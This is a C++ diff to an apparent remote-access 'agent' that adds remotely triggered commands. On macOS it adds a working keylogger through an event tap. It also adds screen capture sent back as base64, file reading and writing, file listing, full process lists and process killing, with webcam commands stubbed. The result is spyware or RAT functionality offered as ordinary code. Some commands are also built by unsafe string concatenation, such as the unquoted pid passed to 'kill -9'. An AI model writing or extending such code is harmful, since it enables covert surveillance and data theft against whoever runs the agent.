@@ -3,7 +3,9 @@
 #include <chrono>
 #include <cstring>
 #include <ctime>
+#include <fstream>
 #include <iostream>
+#include <mutex>
 #include <sstream>
 #include <string>
 #include <thread>
@@ -22,9 +24,126 @@ constexpr SocketType INVALID_SOCKET_FD = INVALID_SOCKET;
 #include <unistd.h>
 using SocketType = int;
 constexpr SocketType INVALID_SOCKET_FD = -1;
+
+#endif
+
+#ifdef __APPLE__
+#include <ApplicationServices/ApplicationServices.h>
 #endif
 
 namespace {
+  std::string escapeJson(const std::string& input);
+  std::string shellSingleQuote(const std::string& s);
+  std::vector<std::string> splitLines(const std::string& s);
+
+#ifdef __APPLE__
+  std::thread g_keyloggerThread;
+  std::mutex g_keyloggerMutex;
+  bool g_keyloggerRunning = false;
+  CFMachPortRef g_keyTap = nullptr;
+  CFRunLoopRef g_keyRunLoop = nullptr;
+  const char* kKeylogPath = "/tmp/remote_agent_keylogger.log";
+
+  void appendKeylogLine(const std::string& line) {
+    std::ofstream out(kKeylogPath, std::ios::app);
+    if (!out) return;
+    out << line << '\n';
+  }
+
+  CGEventRef keyTapCallback(CGEventTapProxy /*proxy*/, CGEventType type, CGEventRef event, void* /*refcon*/) {
+    if (type == kCGEventKeyDown) {
+      const auto now = std::time(nullptr);
+      const auto keyCode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+      appendKeylogLine(std::to_string(static_cast<long long>(now)) + " keycode=" +
+                       std::to_string(static_cast<long long>(keyCode)));
+    }
+    return event;
+  }
+
+  void keyloggerThreadMain() {
+    const auto mask = CGEventMaskBit(kCGEventKeyDown);
+    g_keyTap = CGEventTapCreate(kCGHIDEventTap, kCGHeadInsertEventTap, kCGEventTapOptionListenOnly,
+                                mask, keyTapCallback, nullptr);
+    if (!g_keyTap) {
+      appendKeylogLine("ERROR: cannot create event tap (need Input Monitoring permission).");
+      std::lock_guard<std::mutex> lock(g_keyloggerMutex);
+      g_keyloggerRunning = false;
+      return;
+    }
+
+    CFRunLoopSourceRef source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, g_keyTap, 0);
+    g_keyRunLoop = CFRunLoopGetCurrent();
+    CFRunLoopAddSource(g_keyRunLoop, source, kCFRunLoopCommonModes);
+    CGEventTapEnable(g_keyTap, true);
+    appendKeylogLine("KEYLOGGER_START ok");
+    CFRunLoopRun();
+
+    CFRunLoopRemoveSource(g_keyRunLoop, source, kCFRunLoopCommonModes);
+    CFRelease(source);
+    CFRelease(g_keyTap);
+    g_keyTap = nullptr;
+    g_keyRunLoop = nullptr;
+  }
+
+  std::string keyloggerStartJson() {
+    std::lock_guard<std::mutex> lock(g_keyloggerMutex);
+    if (g_keyloggerRunning) {
+      return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"already_running\"}";
+    }
+    std::ofstream reset(kKeylogPath, std::ios::trunc);
+    if (!reset) {
+      return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"log_file_open_failed\"}";
+    }
+    g_keyloggerRunning = true;
+    g_keyloggerThread = std::thread(keyloggerThreadMain);
+    return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"started\"}";
+  }
+
+  std::string keyloggerStopJson() {
+    {
+      std::lock_guard<std::mutex> lock(g_keyloggerMutex);
+      if (!g_keyloggerRunning) {
+        return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"message\":\"not_running\",\"output\":\"\"}";
+      }
+      g_keyloggerRunning = false;
+    }
+    if (g_keyRunLoop) {
+      CFRunLoopStop(g_keyRunLoop);
+    }
+    if (g_keyloggerThread.joinable()) {
+      g_keyloggerThread.join();
+    }
+    std::ifstream in(kKeylogPath);
+    std::stringstream ss;
+    ss << in.rdbuf();
+    return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"output\":\"" + escapeJson(ss.str()) + "\"}";
+  }
+
+  std::string keyloggerGetLogJson() {
+    std::ifstream in(kKeylogPath);
+    if (!in) {
+      return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
+             std::string(g_keyloggerRunning ? "true" : "false") + ",\"output\":\"\"}";
+    }
+    std::stringstream ss;
+    ss << in.rdbuf();
+    return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
+           std::string(g_keyloggerRunning ? "true" : "false") + ",\"output\":\"" +
+           escapeJson(ss.str()) + "\"}";
+  }
+#else
+  std::string keyloggerStartJson() {
+    return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"unsupported_os\"}";
+  }
+
+  std::string keyloggerStopJson() {
+    return "{\"ok\":false,\"command\":\"KEYLOGGER_STOP\",\"message\":\"unsupported_os\"}";
+  }
+
+  std::string keyloggerGetLogJson() {
+    return "{\"ok\":false,\"command\":\"KEYLOGGER_GET_LOG\",\"message\":\"unsupported_os\"}";
+  }
+#endif
 
   std::string trim(const std::string& input) {
     const auto start = input.find_first_not_of(" \t\r\n");
@@ -85,10 +204,6 @@ namespace {
     std::string output;
     while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
       output += buffer.data();
-      if (output.size() > 3000) {
-        output = output.substr(0, 3000) + "\n...[truncated]";
-        break;
-      }
     }
 
   #ifdef _WIN32
@@ -96,15 +211,334 @@ namespace {
   #else
     pclose(pipe);
   #endif
-    return trim(output.empty() ? "empty_output" : output);
+    return trim(output);
+  }
+
+  std::string base64Encode(const std::vector<unsigned char>& data) {
+    static const char* table =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::string out;
+    out.reserve(((data.size() + 2) / 3) * 4);
+    size_t i = 0;
+    while (i + 2 < data.size()) {
+      const unsigned int n = (static_cast<unsigned int>(data[i]) << 16) |
+                             (static_cast<unsigned int>(data[i + 1]) << 8) |
+                             static_cast<unsigned int>(data[i + 2]);
+      out.push_back(table[(n >> 18) & 0x3F]);
+      out.push_back(table[(n >> 12) & 0x3F]);
+      out.push_back(table[(n >> 6) & 0x3F]);
+      out.push_back(table[n & 0x3F]);
+      i += 3;
+    }
+    if (i < data.size()) {
+      unsigned int n = static_cast<unsigned int>(data[i]) << 16;
+      out.push_back(table[(n >> 18) & 0x3F]);
+      if (i + 1 < data.size()) {
+        n |= static_cast<unsigned int>(data[i + 1]) << 8;
+        out.push_back(table[(n >> 12) & 0x3F]);
+        out.push_back(table[(n >> 6) & 0x3F]);
+        out.push_back('=');
+      } else {
+        out.push_back(table[(n >> 12) & 0x3F]);
+        out.push_back('=');
+        out.push_back('=');
+      }
+    }
+    return out;
+  }
+
+  bool base64Decode(const std::string& input, std::vector<unsigned char>& out) {
+    static const std::string chars =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::vector<int> table(256, -1);
+    for (size_t i = 0; i < chars.size(); ++i) table[static_cast<unsigned char>(chars[i])] = static_cast<int>(i);
+
+    out.clear();
+    int val = 0;
+    int valb = -8;
+    for (unsigned char c : input) {
+      if (c == '=') break;
+      if (c == '\r' || c == '\n' || c == ' ' || c == '\t') continue;
+      if (table[c] == -1) return false;
+      val = (val << 6) + table[c];
+      valb += 6;
+      if (valb >= 0) {
+        out.push_back(static_cast<unsigned char>((val >> valb) & 0xFF));
+        valb -= 8;
+      }
+    }
+    return true;
+  }
+
+  std::string readFileBase64Json(const std::string& path) {
+    std::ifstream file(path, std::ios::binary);
+    if (!file) {
+      return "{\"ok\":false,\"command\":\"READ_FILE_BASE64\",\"message\":\"open_failed\"}";
+    }
+    file.seekg(0, std::ios::end);
+    std::streamsize size = file.tellg();
+    file.seekg(0, std::ios::beg);
+    if (size < 0) {
+      return "{\"ok\":false,\"command\":\"READ_FILE_BASE64\",\"message\":\"read_failed\"}";
+    }
+    std::vector<unsigned char> buffer(static_cast<size_t>(size));
+    if (size > 0 && !file.read(reinterpret_cast<char*>(buffer.data()), size)) {
+      return "{\"ok\":false,\"command\":\"READ_FILE_BASE64\",\"message\":\"read_failed\"}";
+    }
+    const std::string b64 = base64Encode(buffer);
+    return "{\"ok\":true,\"command\":\"READ_FILE_BASE64\",\"path\":\"" + escapeJson(path) +
+           "\",\"data\":\"" + b64 + "\"}";
+  }
+
+  std::string writeFileBase64Json(const std::string& path, const std::string& dataB64) {
+    std::vector<unsigned char> bytes;
+    if (!base64Decode(dataB64, bytes)) {
+      return "{\"ok\":false,\"command\":\"WRITE_FILE_BASE64\",\"message\":\"invalid_base64\"}";
+    }
+    std::ofstream file(path, std::ios::binary);
+    if (!file) {
+      return "{\"ok\":false,\"command\":\"WRITE_FILE_BASE64\",\"message\":\"open_failed\"}";
+    }
+    if (!bytes.empty()) file.write(reinterpret_cast<const char*>(bytes.data()), static_cast<std::streamsize>(bytes.size()));
+    if (!file) {
+      return "{\"ok\":false,\"command\":\"WRITE_FILE_BASE64\",\"message\":\"write_failed\"}";
+    }
+    return "{\"ok\":true,\"command\":\"WRITE_FILE_BASE64\",\"path\":\"" + escapeJson(path) +
+           "\",\"bytes\":" + std::to_string(bytes.size()) + "}";
+  }
+
+  std::string listFilesJson(const std::string& dirPath) {
+#ifdef _WIN32
+    const std::string cmd =
+        "powershell -NoProfile -Command \"Get-ChildItem -LiteralPath '" +
+        escapeSingleQuotesPowerShell(dirPath) +
+        "' -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName\"";
+#else
+    const std::string cmd = "sh -c \"ls -1p " + shellSingleQuote(dirPath) + " 2>/dev/null | sed '/\\/$/d'\"";
+#endif
+    const std::string out = runShellCommand(cmd);
+    std::vector<std::string> lines = splitLines(out);
+    std::string items = "[";
+    for (size_t i = 0; i < lines.size(); ++i) {
+      if (i > 0) items += ",";
+#ifdef _WIN32
+      items += "\"" + escapeJson(lines[i]) + "\"";
+#else
+      std::string full = dirPath;
+      if (!full.empty() && full.back() != '/') full += "/";
+      full += lines[i];
+      items += "\"" + escapeJson(full) + "\"";
+#endif
+    }
+    items += "]";
+    return "{\"ok\":true,\"command\":\"LIST_FILES\",\"dir\":\"" + escapeJson(dirPath) + "\",\"items\":" + items + "}";
   }
 
   std::string listProcesses() {
   #ifdef _WIN32
     return runShellCommand("tasklist /FO TABLE");
   #else
-    return runShellCommand("ps -axo pid,comm | head -n 20");
+    return runShellCommand("ps -axo pid,comm");
   #endif
+  }
+
+  std::string joinParts(const std::vector<std::string>& parts, size_t from) {
+    std::string s;
+    for (size_t i = from; i < parts.size(); ++i) {
+      if (i > from) s += ' ';
+      s += parts[i];
+    }
+    return s;
+  }
+
+  std::string escapeForDoubleQuotedShell(const std::string& input) {
+    std::string out;
+    for (char c : input) {
+      if (c == '\\' || c == '"') out += '\\';
+      out += c;
+    }
+    return out;
+  }
+
+  std::string escapeSingleQuotesPowerShell(const std::string& input) {
+    std::string out;
+    for (char c : input) {
+      if (c == '\'') out += "''";
+      else out += c;
+    }
+    return out;
+  }
+
+  std::string stripAppBundleSuffix(const std::string& s) {
+    const std::string suffix = ".app";
+    if (s.size() > suffix.size() &&
+        s.compare(s.size() - suffix.size(), suffix.size(), suffix) == 0) {
+      return s.substr(0, s.size() - suffix.size());
+    }
+    return s;
+  }
+
+  std::string escapeAppleScriptString(const std::string& input) {
+    std::string out;
+    for (char c : input) {
+      if (c == '\\' || c == '"') out += '\\';
+      out += c;
+    }
+    return out;
+  }
+
+  std::string stopAppByName(const std::string& appName) {
+    std::string out;
+#ifdef __APPLE__
+    const std::string display = stripAppBundleSuffix(appName);
+    out = runShellCommand("osascript -e \"tell application \\\"" + escapeAppleScriptString(display) +
+                          "\\\" to quit\" 2>&1");
+#elif defined(_WIN32)
+    {
+      const std::string n = stripAppBundleSuffix(appName);
+      out = runShellCommand(
+          "powershell -NoProfile -Command \"Get-Process -Name '" + escapeSingleQuotesPowerShell(n) +
+          "' -ErrorAction SilentlyContinue | Stop-Process -Force\" 2>&1");
+    }
+#else
+    out = runShellCommand("killall -q \"" + escapeForDoubleQuotedShell(stripAppBundleSuffix(appName)) +
+                          "\" 2>&1");
+#endif
+    return "{\"ok\":true,\"command\":\"STOP_APP_BY_NAME\",\"output\":\"" + escapeJson(out) + "\"}";
+  }
+
+  std::string listApplications() {
+   #ifdef _WIN32
+    return runShellCommand(
+        "powershell -NoProfile -Command \"Get-ChildItem -LiteralPath $env:ProgramFiles -Directory "
+        "-ErrorAction SilentlyContinue | Select-Object -First 45 -ExpandProperty Name\"");
+   #elif defined(__APPLE__)
+    return runShellCommand("ls /Applications 2>/dev/null");
+   #else
+    return runShellCommand(
+        "ls /usr/share/applications/*.desktop 2>/dev/null | xargs -n1 basename -s .desktop");
+   #endif
+  }
+
+  std::string toLowerAscii(const std::string& s) {
+    std::string r = s;
+    for (char& c : r) {
+      if (c >= 'A' && c <= 'Z') c = static_cast<char>(c - 'A' + 'a');
+    }
+    return r;
+  }
+
+  std::string shellSingleQuote(const std::string& s) {
+    std::string r = "'";
+    for (char c : s) {
+      if (c == '\'') r += "'\\''";
+      else r += c;
+    }
+    r += "'";
+    return r;
+  }
+
+  std::vector<std::string> splitLines(const std::string& s) {
+    std::vector<std::string> out;
+    std::istringstream stream(s);
+    std::string line;
+    while (std::getline(stream, line)) {
+      const std::string t = trim(line);
+      if (!t.empty()) out.push_back(t);
+    }
+    return out;
+  }
+
+  bool isAppRunning(const std::string& appLine) {
+#ifdef __APPLE__
+    const std::string pattern = "/" + appLine + "/";
+    const std::string cmd = "pgrep -f " + shellSingleQuote(pattern) + " 2>/dev/null | head -1";
+    const std::string out = runShellCommand(cmd);
+    return !out.empty() && out != "shell_error";
+#elif defined(_WIN32)
+    const std::string snap = runShellCommand("tasklist /FO CSV /NH");
+    if (snap.empty() || snap == "shell_error") return false;
+    const std::string lowerSnap = toLowerAscii(snap);
+    const std::string lowerName = toLowerAscii(appLine);
+    return lowerSnap.find(lowerName) != std::string::npos;
+#else
+    const std::string cmd = "pgrep -f " + shellSingleQuote(appLine) + " 2>/dev/null | head -1";
+    const std::string out = runShellCommand(cmd);
+    return !out.empty() && out != "shell_error";
+#endif
+  }
+
+  std::string captureScreenshotBase64(std::string& errorOut) {
+#ifdef _WIN32
+    const std::string cmd =
+        "powershell -NoProfile -Command \"$ErrorActionPreference='Stop'; "
+        "Add-Type -AssemblyName System.Windows.Forms; "
+        "Add-Type -AssemblyName System.Drawing; "
+        "$bounds=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
+        "$bmp=New-Object System.Drawing.Bitmap($bounds.Width,$bounds.Height); "
+        "$g=[System.Drawing.Graphics]::FromImage($bmp); "
+        "$g.CopyFromScreen($bounds.Location,[System.Drawing.Point]::Empty,$bounds.Size); "
+        "$ms=New-Object System.IO.MemoryStream; "
+        "$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png); "
+        "$g.Dispose(); "
+        "$bmp.Dispose(); "
+        "[Convert]::ToBase64String($ms.ToArray())\" 2>&1";
+#elif defined(__APPLE__)
+    const std::string cmd =
+        "sh -c 'tmp=\"/tmp/rca_shot_$$.png\"; "
+        "screencapture -x -t png \"$tmp\" >/dev/null 2>&1 && "
+        "base64 < \"$tmp\" | tr -d \"\\n\"; "
+        "rc=$?; rm -f \"$tmp\"; exit $rc' 2>/dev/null";
+#else
+    const std::string cmd =
+        "sh -c 'tmp=\"/tmp/rca_shot_$$.png\"; "
+        "(import -window root \"$tmp\" >/dev/null 2>&1 || "
+        "gnome-screenshot -f \"$tmp\" >/dev/null 2>&1 || "
+        "grim \"$tmp\" >/dev/null 2>&1) && "
+        "base64 < \"$tmp\" | tr -d \"\\n\"; "
+        "rc=$?; rm -f \"$tmp\"; exit $rc' 2>/dev/null";
+#endif
+    const std::string out = runShellCommand(cmd);
+    if (out.empty() || out == "shell_error") {
+      errorOut = "screenshot_failed_or_permission_denied";
+      return "";
+    }
+    return out;
+  }
+
+  std::string screenshotJsonResponse() {
+    std::string error;
+    const std::string b64 = captureScreenshotBase64(error);
+    if (b64.empty()) {
+      return "{\"ok\":false,\"command\":\"SCREENSHOT\",\"message\":\"" + escapeJson(error) + "\"}";
+    }
+    return "{\"ok\":true,\"command\":\"SCREENSHOT\",\"mime\":\"image/png\",\"data\":\"" + escapeJson(b64) +
+           "\"}";
+  }
+
+  std::string listApplicationsWithStatusJson() {
+    const std::string list = listApplications();
+    const std::vector<std::string> lines = splitLines(list);
+    std::string items = "[";
+    for (size_t i = 0; i < lines.size(); ++i) {
+      if (i > 0) items += ",";
+      const bool running = isAppRunning(lines[i]);
+      items += "{\"name\":\"" + escapeJson(lines[i]) + "\",\"running\":" +
+               (running ? "true" : "false") + "}";
+    }
+    items += "]";
+    return "{\"ok\":true,\"command\":\"LIST_APPS\",\"items\":" + items + ",\"output\":\"" +
+           escapeJson(list) + "\"}";
+  }
+
+  std::string killProcessByPid(const std::string& pid, const std::string& commandLabel) {
+   #ifdef _WIN32
+    const std::string out = runShellCommand("taskkill /PID " + pid + " /F 2>&1");
+   #else
+    const std::string out = runShellCommand("kill -9 " + pid + " 2>&1");
+   #endif
+    return "{\"ok\":true,\"command\":\"" + escapeJson(commandLabel) +
+           "\",\"output\":\"" + escapeJson(out) + "\"}";
   }
 
   std::string commandNotImplemented(const std::string& cmd) {
@@ -127,11 +561,57 @@ namespace {
       return "{\"ok\":true,\"command\":\"LIST_PROCESSES\",\"output\":\"" +
             escapeJson(listProcesses()) + "\"}";
     }
-    if (cmd == "SCREENSHOT") {
-      return commandNotImplemented(cmd + " (hook native API)");
+    if (cmd == "KILL_PROCESS" && parts.size() >= 2) {
+      return killProcessByPid(parts[1], "KILL_PROCESS");
     }
-    if (cmd == "LIST_APPS" || cmd == "START_APP" || cmd == "STOP_APP" ||
-        cmd == "KILL_PROCESS" || cmd == "KEYLOGGER_START" || cmd == "KEYLOGGER_STOP" ||
+    if (cmd == "STOP_APP_BY_PID" && parts.size() >= 2) {
+      return killProcessByPid(parts[1], "STOP_APP_BY_PID");
+    }
+    if (cmd == "LIST_APPS") {
+      return listApplicationsWithStatusJson();
+    }
+    if (cmd == "START_APP_BY_NAME" || cmd == "START_PROCESS" && parts.size() >= 2) {
+      const std::string appName = joinParts(parts, 1);
+      std::string out;
+#ifdef _WIN32
+      out = runShellCommand(
+          "powershell -NoProfile -Command \"Start-Process '" + escapeSingleQuotesPowerShell(appName) +
+          "'\" 2>&1");
+#elif defined(__APPLE__)
+      out = runShellCommand("open -a \"" + escapeForDoubleQuotedShell(appName) + "\" 2>&1");
+#else
+      out = runShellCommand("gtk-launch \"" + escapeForDoubleQuotedShell(appName) + "\" 2>&1");
+#endif
+      return "{\"ok\":true,\"command\":\"START_APP_BY_NAME\",\"output\":\"" + escapeJson(out) + "\"}";
+    }
+    if (cmd == "STOP_APP_BY_NAME" && parts.size() >= 2) {
+      const std::string appName = joinParts(parts, 1);
+      return stopAppByName(appName);
+    }
+    if (cmd == "READ_FILE_BASE64" && parts.size() >= 2) {
+      return readFileBase64Json(joinParts(parts, 1));
+    }
+    if (cmd == "WRITE_FILE_BASE64" && parts.size() >= 3) {
+      const std::string dataB64 = parts[1];
+      const std::string path = joinParts(parts, 2);
+      return writeFileBase64Json(path, dataB64);
+    }
+    if (cmd == "LIST_FILES" && parts.size() >= 2) {
+      return listFilesJson(joinParts(parts, 1));
+    }
+    if (cmd == "KEYLOGGER_START") {
+      return keyloggerStartJson();
+    }
+    if (cmd == "KEYLOGGER_STOP") {
+      return keyloggerStopJson();
+    }
+    if (cmd == "KEYLOGGER_GET_LOG") {
+      return keyloggerGetLogJson();
+    }
+    if (cmd == "SCREENSHOT") {
+      return screenshotJsonResponse();
+    }
+    if (cmd == "START_APP" || cmd == "STOP_APP" ||
         cmd == "COPY_FILE" || cmd == "SHUTDOWN" || cmd == "RESTART" ||
         cmd == "WEBCAM_START" || cmd == "WEBCAM_RECORD_START" || cmd == "WEBCAM_RECORD_STOP") {
       return commandNotImplemented(cmd);
